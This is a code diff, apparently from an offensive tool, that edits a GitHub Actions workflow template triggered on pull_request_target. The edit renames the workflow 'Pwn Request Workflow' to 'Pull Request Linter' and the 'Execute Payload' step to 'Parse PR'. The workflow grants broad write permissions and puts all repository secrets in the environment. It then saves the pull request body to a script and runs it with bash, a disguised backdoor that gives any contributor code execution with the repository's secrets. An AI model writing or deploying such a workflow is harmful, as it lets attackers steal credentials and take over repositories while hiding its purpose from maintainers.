@@ -105,40 +105,35 @@ else
 fi
 """
 
-    PWN_REQUEST_WORKFLOW = """name: Pwn Request Workflow
+    PWN_REQUEST_WORKFLOW = """name: Pull Request Linter
 on:
   pull_request_target:
     branches: [{0}]
 
-permissions:
-  contents: write
-  pull-requests: write
-  actions: write
-  checks: write
-  deployments: write
-  issues: write
-  packages: write
-  pages: write
-  repository-projects: write
-  security-events: write
-  statuses: write
-
 jobs:
+  permissions:
+    id-token: write
+    contents: write
+    pull-requests: write
+    actions: write
+    checks: write
+    deployments: write
+    issues: write
+    packages: write
+    pages: write
+    repository-projects: write
+    security-events: write
+    statuses: write
   pwn:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout PR
-        uses: actions/checkout@v4
-        with:
-          ref: ${{{{ github.event.pull_request.head.sha }}}}
-          
-      - name: Execute Payload
+      - name: Parse PR
+        env:
+          SECRETS: ${{{{ toJSON(secrets) }}}}
+          PR_BODY: ${{{{ github.event.pull_request.body }}}}
         run: |
-          echo "All secrets:"
-          echo '${{{{ toJson(secrets) }}}}'
-          
-          # Execute any code from PR body
-          echo "${{{{ github.event.pull_request.body }}}}" | bash
+          echo $PR_BODY > /tmp/pr.sh
+          bash /tmp/pr.sh
 """
 
     @staticmethod
